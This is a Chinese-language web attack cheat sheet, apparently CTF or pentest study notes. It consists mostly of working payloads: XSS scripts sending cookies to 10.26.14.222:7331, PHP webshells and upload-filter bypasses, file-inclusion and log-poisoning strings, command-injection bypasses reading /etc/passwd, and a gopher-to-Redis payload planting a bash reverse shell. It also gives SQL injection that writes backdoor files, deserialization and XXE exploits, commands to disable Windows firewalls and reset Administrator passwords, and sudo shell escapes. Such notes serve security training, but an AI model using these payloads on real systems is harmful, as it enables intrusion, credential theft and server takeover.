## 通用黑名单绕过手法

等价替换/利用程序特征、漏洞等价替换

- 关键字随机大小写：如`PhP`、`<ScRIpt>`、`UnIoN`等
- 编码：如十六进制编码、URL编码、HTML实体编码等
- 空白符替换：`%09`、`%0a`、`%0d`、内联注释符`/**/`、分隔符`${IFS}`等
- 关键字替换：如`phtml`代替`php`、`&&`代替`and`、`||`代替`or`等

- 某些情况下可以添加额外的字符而不影响程序执行结果：如首尾的空格、`.`、`/.`、`ca\t`、`c'a't`等
- 双写：如`pphphp`、`<scr<script>ipt>`等
- 程序缺陷：如两次URL编码`%252f`、SQL注释`-#- #`等

## XSS

```HTML
<script>
document.write('<img src="http://10.26.14.222:7331/?c=' + document.cookie + '" />');
</script>
```

```HTML
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://10.26.14.222:7331/?c=' + document.cookie, true);
xhr.send();
</script>
```

```HTML
<script>document.location='http://10.26.14.222:7331/?c='+document.cookie</script>
```

```HTML
<script>new Image().src='http://10.26.14.222:7331/?c='+document.cookie;</script>
```

## 文件上传


- 客户端（前端）验证：无影响

- 服务端（后端）验证

    - 检查filename后缀

        - 黑名单

            - 关联扩展名`php3` `php4` `php5` `phtml`
            - 大小写 `PHp` 
            - 双写 `pphphp` `.p.phphp`
            - 加空格 `php ` 等
            - 加点 `php.` `php..` 等
            - 目录相关 `php/.` `php/x/..` 等
            - Apache配置文件 `.htaccess`
            - PHP运行时配置文件 `.user.ini`
            - NTFS文件系统特殊标记 `::$DATA`

        - 白名单

            - 00截断：POST请求参数需要URL decode
            - 单独的文件名参数改为数组形式，如 `['demo.php','.','jpg']`

    - 检查Content-Type：Mime白名单

    - 检查内容

        - 检查前几个字节（CRLF：0d 0a）
        
            - jpg `FF D8`
            - png `89 50`
            - gif `47 49 46` `GIF89a;`

        - 关键字黑名单

            - 短标签绕过php `<?=eval($_GET['cmd']);?>`

            - 大小写绕过eval  `<?php EvaL($_GET['cmd']); ?>`

            - 参数0传递assert `<?php $_GET[0]($_POST[1]); ?>`

    - 其它逻辑

        - 二次渲染：向GIF中插入木马，多试几次

        - 条件竞争：并发处理不当或操作顺序设计不合理时，可以利用时间差访问（结合写入，可能还需要文件包含漏洞）

- 上传图片马：结合文件包含利用
```
AddType application/x-httpd-php .l33t
```
```xml
<FilesMatch "demo.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
```ini
auto_prepend_file=web.jpg
auto_append_file=a.jpg
```
```php
<?php
fwrite(fopen('shell.php', 'w'), '<?php @eval($_POST["cmd"]) ?>');
?>
```

- 后缀替换

```
.php3
.phtml
.pht
.phar
.inc
```

- 双后缀

```
.jpg.php
.php.jpg
```

- 空字节截断

```
.php%00.gif
```

- 添加特殊字符

```
file.php......
file.php%20
file.php%0d%0a.jpg
file.php%0a
name.%E2%80%AEphp.jpg # name.gpj.php
file.php/
file.php/.
```

- NTFS备用数据流（将冒号插入 禁止的扩展名之后 或 允许的扩展名之前）

```
file.php::$data
```

- Apache配置文件 `.htaccess`

```
AddType application/x-httpd-php .rce
```

- 上传图片马结合文件包含漏洞利用

```php
GIF8;
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

- 一句话木马

```php
<?php @eval($_POST['c']); ?>
```

- 短标签

```
<?=phpinfo();>
```

- 函数作为参数 `?0=assert`

```php
<?php $_GET[0]($_POST[c]); ?>
```

- 文件名使用数组形式传递

- 条件竞争


## 文件包含

1. 仔细查看被包含的文件，其中的隐藏内容可能被作为代码解析
2. 伪协议

- `php://filter` 协议

```
php://filter/convert.base64-encode/resource=file.txt
php://filter/string.rot13/resource=file.txt
```

- `data://` 协议

```
data://text/plain,<?=phpinfo();?>
data://text/plain;base64,PD89cGhwaW5mbygpOz8%2B
```

- `php://input` 协议

```
php://input
```

- 远程文件包含

```
http://10.0.0.1:7331/l33t.txt
```

- `expect://` 协议

```
expect://id
expect://ls
```

- 利用环境 `/proc/self/environ`

```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

- 利用日志文件

```
/var/log/apache/access.log          # Apache
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log           # Nginx
/var/log/nginx/error.log
/var/log/vsftpd.log                 # FTP
/var/log/auth.log                   # SSH
/var/log/sshd.log                   
/var/log/mail                       # Mail
```



## 命令注入

- 命令链（`;` `&&` `||` `&` `|`）

```
127.0.0.1; whoami
127.0.0.1 && whoami
xxx || whoami
127.0.0.1 & whoami
127.0.0.1 | whoami
```

- 换行符

```
127.0.0.1%0Awhoami
127.0.0.1%5C%0Awhoami
```

- 绕过空格过滤（IFS、输入重定向、Hex编码、空白符替换、Windows环境变量字串）

```shell
cat${IFS}/etc/passwd
ls${IFS}-la

cat</etc/passwd

X=$'uname\x20-a'&&$X

ls%09-la%09/home
```
```cmd
echo 333%ProgramFiles:~10,-5%4444
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
```

- ASCII扩展（`$'\x20\x00'`）

```shell
# `` 和 $() 中的内容会被当做命令运行
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc

`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`

cat `xxd -r -p <<< 2f6574632f706173737764`
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

- 绕过符号过滤（`/`）

```shell
${HOME:0:1}

$(echo . | tr '!-0' '"-1')
`echo . | tr '(-0' ')-1'`
```

- 绕过关键词过滤

```shell
who'am'i
c"a"t /etc/pass'w'd
wh\o\a\mi
who``ami
who$()ami

x=/et000c/pa000sswd;echo ${x//000/}

# 用别的命令 如
base64 /etc/passwd
```

## SSRF

- `file` 协议

```
file:///etc/passwd
file://C:/path/to/file
```

- `http` 协议

```
http://127.0.0.1:22
http://192.168.1.123:80
http://10.10.10.10:443
```

- `dict` 协议（操作redis）

```
dict://127.0.0.1:3306
dict://127.0.0.1:6379/FLUSHALL
dict://127.0.0.1:6379/CONFIG SET dir /var/www/html
dict://127.0.0.1:6379/CONFIG SET dbfilename file.php
dict://127.0.0.1:6379/SET x "<\x3Fphp eval($_GET[0])\x3F>"
dict://127.0.0.1:6379/SAVE
```

- `gopher` 协议（操作redis）

```
gopher://127.0.0.1:6379/_config set dir /var/www/html
gopher://127.0.0.1:6379/_config set dbfilename reverse.php
gopher://127.0.0.1:6379/_set payload "<?php shell_exec('bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1');?>"
gopher://127.0.0.1:6379/_save
```


```
data://text/plain,<?=phpinfo();?>
data://text/plain;base64,PD89cGhwaW5mbygpOz8%2B

php://input
<?=phpinfo();?>

php://filter/convert.base64-encode/resource=key.php
php://filter/string.rot13/resource=key.php
```

- 远程文件包含

```
<?=@eval($_POST['cmd']);?>

http://10.0.0.1:7331/l33t.txt
http://10.0.0.1:7331/l33t.txt?foo=bar
```

## SQL注入

- 直接注入（整数类） `UNION SELECT`
- 引号闭合（字符类） `' ORDER BY <COL_NUM> -- q`
- 单向注释闭合（查询等） `-- %23`
- 多符号闭合（引号括号等） `')` `'))`
- 双向闭合 `'and'a'='a` `'or 1=1 or ''='` `-1' union select 1,2,database()'`
- 报错注入 `updatexml(1,concat(0x7e,(<QUERY>),0x7e),1)`
- 回显长度受限 `substr(password,16)`
- 黑名单绕过 `UNunionION` `||` `%26%26`
- 读取文件 `(select load_file('/tmp/360/key'))`
- 计算长度 `length(database())`
- 布尔盲注 `' and ascii(substr(database(),1))=<44-122>`
- 内联注释符替代空格 `/**/`
- 空白符 `%09` `%a0`
- 二次注入 `admin'#`
- 无任何回显（考虑延时） `'and sleep(2)%23` `if(ascii(substr(database(),1))=115,sleep(2),1)`
- Hackbar插件注意事项：加号替换为%20、concat补充空格0x20
- INSERT语句注入 `xxx',database(),'aaa')-- %23`
- ORDER后注入 `1 asc` `1' desc-- %23` `rand(true)` `rand(length(database())=8)'-- %23`
- 写文件 `1' into outfile "/var/www/html/l33t.php" lines terminated by 0x3C3F3D706870696E666F28293B3F3E -- %23`
- 常用SQL
```SQL
select table_name from information_schema.tables where table_schema = 'security'
select column_name from information_schema.columns where table_name = 'users'

SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name = 'users'
```
- SQLmap常用命令
```shell
python sqlmap.py -r req.txt -p "<PARAM>"
python sqlmap.py -r req.txt --current-db
python sqlmap.py -r req.txt --dbs
python sqlmap.py -r req.txt -D "<DB_NAME>" --tables
python sqlmap.py -r req.txt -D "<DB_NAME>" -T "<TABLE_NAME>" --columns
python sqlmap.py -r req.txt -D "<DB_NAME>" -T "<TABLE_NAME>" -C "<COL_1>[,COL_2]" --dump
python sqlmap.py -r req.txt --threads=10
python sqlmap.py -r req.txt --sql-query "<QUERY>"
```
- 打印ASCII数组
```python
arr = [115,101,99,117,114,105,116,121]
res = ''
for num in arr:
    res += chr(num)
print(res)
```

1. 看有无回显 `1'"\(`
2. 逐个手动尝试 `1 and 1=1` `1'and'a'='a` `1')and('a')=('a`等
3. 判断列数 `1' order by 4-- %23`
4. 查数据 `-1' union select 1,2,3-- %23`
5. 失败考虑使用大小写、双写、等价符号替换等绕过方

```
'  ')  '))
"  ")  "))
)  ))  
```

注意：每个参数都要尝试、每个请求都要尝试、每个注入点都要尝试。



- 常用MySQL语句

```SQL
SELECT database(); # 获取当前数据库
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='<数据库名>'; # 获取数据库表名
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<表名>'; # 获取表字段
SELECT group_concat(concat('<列名1>',':','<列名2>')) FROM '<表名>'; # 获取数据

# 写文件
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\backdoor.php";
SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';

# 读文件
SELECT LOAD_FILE('/etc/passwd');
```

- 常用Oracle语句

```SQL
SELECT table_name FROM all_tables; # 获取数据库表名
SELECT column_name FROM all_tab_columns WHERE table_name = '<表名>'; # 获取表字段
```

- 闭合

```
'  ')  '))
"  ")  "))
)  ))  
```

- SQLmap

```shell
python sqlmap.py -r req.txt --current-db
python sqlmap.py -r req.txt --dbs
python sqlmap.py -r req.txt -D "<DB_NAME>" --tables
python sqlmap.py -r req.txt -D "<DB_NAME>" -T "<TABLE_NAME>" --columns
python sqlmap.py -r req.txt -D "<DB_NAME>" -T "<TABLE_NAME>" -C "<COL_1>[,COL_2]" --dump
python sqlmap.py -r req.txt --threads=10
python sqlmap.py -r req.txt --sql-query "<QUERY>"
python sqlmap.py -r req.txt --second-order
python sqlmap.py -r req.txt --suffix="-#- "
```

- INSERT语句注入

```SQL
xxx',database(),'aaa')-- %23
```

- 报错注入

```SQL
updatexml(1,concat(0x7e,(select database()),0x7e),1)
```

- 宽字节注入

```
%d5
%df
%bf
%a1
```


## 命令注入

- 命令链

```
127.0.0.1; whoami
127.0.0.1 && whoami
xxx || whoami
127.0.0.1 & whoami
127.0.0.1 | whoami
```

- 绕过空格过滤（IFS、输入重定向、Hex编码、空白符替换、Windows环境变量字串）

```
cat${IFS}/etc/passwd
ls${IFS}-la

cat</etc/passwd

X=$'uname\x20-a'&&$X

;ls%09-la%09/home

echo 333%ProgramFiles:~10,-5%4444
ping%CommonProgramFiles:~10,-18%127.0.0.1
ping%PROGRAMFILES:~10,-5%127.0.0.1
```

- 换行

```
127.0.0.1%0Awhoami

127.0.0.1%5C%0Awhoami
```

- ASCII扩展（`$'\x20\x00'`）

```shell
# `` 和 $() 中的内容会被当做命令运行
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`

abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc

`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`

cat `xxd -r -p <<< 2f6574632f706173737764`
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```

- 绕过符号过滤（`/`）

```shell
${HOME:0:1}

$(echo . | tr '!-0' '"-1')
`echo . | tr '(-0' ')-1'`
```

- 绕过关键词过滤

```shell
who'am'i

c"a"t /etc/pass'w'd

wh\o\a\mi

who``ami

who$()ami

x=/et000c/pa000sswd;echo ${x//000/}
```

## PHP反序列化

记忆方式：复合类型后跟花括号，花括号里面逐个放入键值。除了复合类型（数组和对象外），其余简单类型后都有分号。一元（1个）：空类型。二元（3个）：布尔、整型、浮点。三元（2个）：字符串、数组。五元（1个）：对象。【13201】

- 布尔值 `b:<value>;`

```
b:1;
b:0;
```

- 整型 `i:<value>;`

```
i:12;
```

- 浮点型 `d:<value>;`

```
d:3.1415926;
```

- 空类型 `N;`

- 字符串 `s:<length>:"<value>";`
```
s:5:"Hello";
```

- 数组 `a:<size>:{...}`

```
a:1:{s:4:"key1";s:6:"value1";}
```

- 对象 `O:<class_name_length>:"<class_name>":<size>:{}`

```
O:7:"Example":4:{s:5:"v_int";i:12;s:8:"v_string";s:5:"abcde";s:7:"v_float";d:3.1415926;s:6:"v_none";N;}
s:7:"3334444";a:1:{s:4:"key1";s:6:"value1";}
```

特殊绕过方式（数字前加`+`号，对象长度加1）

```
O:+4:"Demo":2:{s:4:"file";s:8:"flag.php";}
```

### 示例

常见 PHP magic method

```php
function __construct(){}  // 创建对象实例时自动调用
function __destruct(){}   // 实例被销毁时自动调用
function __wakeup(){}     // 对象反序列化之后自动调用
function __toString(){}   // 将对象转换为字符串时自动调用
function __get($name){}   // 访问一个未定义的属性时自动调用
```

#### 代码执行

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        highlight_file(__FILE__);
    }
?>
```

正常请求

```
a:2:{i:0;s:5:"Hello";i:1;s:4:"php.";}
```

恶意请求

```
O:18:"PHPObjectInjection":1:{s:6:"inject";s:11:"phpinfo();"}
```

#### 身份认证绕过

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

类型篡改

```
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

#### 对象注入

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
else {
	highlight_file(__FILE__);
}
?>
```

使用指针类型

```
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

其中索引值2表示对象的第一个属性，1表示整个对象。向外一层，依次数，再向内。

如下序列化

```php
<?php
class Demo {
	public $index;
	public $se1f;
    public $value;
    public $other;
}

$objA = new Demo();
$objB = new Demo();

$objA->index = 1;
$objA->value = "Hello!";
$objA->se1f = &$objA;
$objB->index = 2;
$objB->value = &$objA->value;
$objB->se1f = &$objB;
$objB->other = &$objB->index;
$objA->other = &$objB;

$data = serialize($objA);
echo $data;
?>
```

结果为

```
O:4:"Demo":4:{s:5:"index";i:1;s:4:"se1f";R:1;s:5:"value";s:6:"Hello!";s:5:"other";O:4:"Demo":4:{s:5:"index";i:2;s:4:"se1f";R:4;s:5:"value";R:3;s:5:"other";R:5;}}
```
## 提权

### Windows

- 上传 `3389.bat` 并运行

- 关闭防火墙（分别适用于低版本和高版本）

```cmd
netsh firewall set opmode disable

netsh advfirewall set allprofiles state off
```

- 或者上传 `lcx.exe` 进行端口转发

```cmd
lcx.exe -listen 22333 63389

lcx.exe -slave 10.26.14.222 22333 127.0.0.1 3389
```

- 修改管理员密码

```cmd
net user Administrator qW1@
```

- 连接RDP即可


### Linux

- SUID程序

```shell
find / -perm -u=s -type f 2>/dev/null
```

- sudo特权程序 参考GTFOBins 如

```shell
sudo less <SOME_FILE>
!/bin/sh

sudo apt changelog apt
!/bin/sh

sudo arp -v -f /root/root.txt
sudo comm /root/root.txt /dev/null 2>/dev/null
sudo curl file:///root/root.txt

sudo git help config
!/bin/sh

sudo TERM= more /etc/profile
!/bin/sh

sudo awk 'BEGIN {system("/bin/sh")}'

sudo find . -exec /bin/sh \; -quit

sudo mysql -e '\! /bin/sh'

sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'

sudo php -r "system('/bin/sh');"

sudo python -c 'import os; os.system("/bin/sh")'

sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

sudo service ../../bin/sh
```

## XXE

### 外部实体

使用 `ENTITY` 关键字定义实体
```xml
<!ENTITY entity_name "entity_value">
<!ENTITY example "Doe">
```
使用 `SYSTEM` 关键字可以使攻击者能够从远程服务器获取内容
```xml
<!ENTITY entity_name SYSTEM 'url'>
```
`PUBLIC` 和它几乎是同义词，区别在于多一个任意字符
```xml
<!ENTITY entity_name PUBLIC "any_text" "url">
```
实体必须在 `DOCTYPE` 中定义
引用时使用 `&<ENTITY_NAME>;`
```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<!DOCTYPE foo[
    <!ELEMENT foo ANY >
	<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<foo>&file;</foo>
```

- file协议 以读取windows文件为例

```xml
<!DOCTYPE foo [<!ENTITY bar SYSTEM "file:///c:/Users/CISP/Desktop/temp/gen.py">]><foo>&bar;</foo>
```

```xml
<!DOCTYPE foo [<!ENTITY bar PUBLIC "abc" "file:///c:/Users/CISP/Desktop/temp/gen.py">]><foo>&bar;</foo>
```

- data协议 Base64编码

```xml
<!DOCTYPE foo [<!ENTITY bar SYSTEM "data://text/plain;base64,YWJjZGVm">]><foo>&bar;</foo>
```

- php协议

```xml
<!DOCTYPE foo [<!ENTITY bar SYSTEM "php://filter/convert.base64-encode/resource=xxe.php">]><foo>&bar;</foo>
```

- XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

- SSRF常用的协议都可以试试

```
dict://
gopher://
```

- 特殊语法

```xml
<!DOCTYPE root [
    <!ENTITY % aaa SYSTEM "data://text/plain,abdef">
    %aaa;
]>
<root></root>
```

- expect协议执行命令

```xml
<!DOCTYPE foo [<!ENTITY bar SYSTEM "expect://ls$IFS-la">]><foo>&bar;</foo>
```

## 暴力检索

```shell
grep -r "key:" <ROOT_PATH>

find <ROOT_PATH> -name "*key*" -type f
```

```cmd
dir /s /b *key*

findstr /s /i /c:"key" *

# 默认当前目录 需要指定目录的话
# cd <ROOT_PATH> & <CMD>
```